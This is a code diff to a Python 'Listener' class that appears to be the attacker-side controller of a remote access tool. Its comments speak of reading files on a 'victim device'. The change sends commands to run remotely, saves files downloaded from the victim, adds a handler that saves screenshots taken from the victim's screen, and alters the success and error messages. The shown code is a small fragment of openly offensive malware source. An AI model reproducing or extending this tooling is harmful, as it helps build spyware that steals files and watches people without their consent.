@@ -40,7 +40,7 @@ class Listener:
         # Method writing data to file
         with open(file_path, 'wb') as file:
             file.write(base64.b64decode(file_data))
-            return '[+] Download successful.'
+            return '[+] Operation successful.'
 
     def read_file(self, file_path):
     # Function which read files on victim device
@@ -59,11 +59,13 @@ class Listener:
                     command.append(self.read_file(command[1]))
 
                 result = self.execute_remotely(command)
-
-                if command[0] == 'download' and '[-] Error ' not in result:
-                    result = self.write_file(command[1], result.encode())
-            except Exception:
-                result = '[-] Error occuered during executing command.'
+                if '[-] Error ' not in result:
+                    if command[0] == 'download':
+                        result = self.write_file(command[1], result.encode())
+                    elif command[0] == 'screenshot':
+                        result = self.write_file('screen.png', result.encode())
+            except Exception as e:
+                result = f'[-] Error occuered during executing command. {e}'
             print(result)
 
 # Example
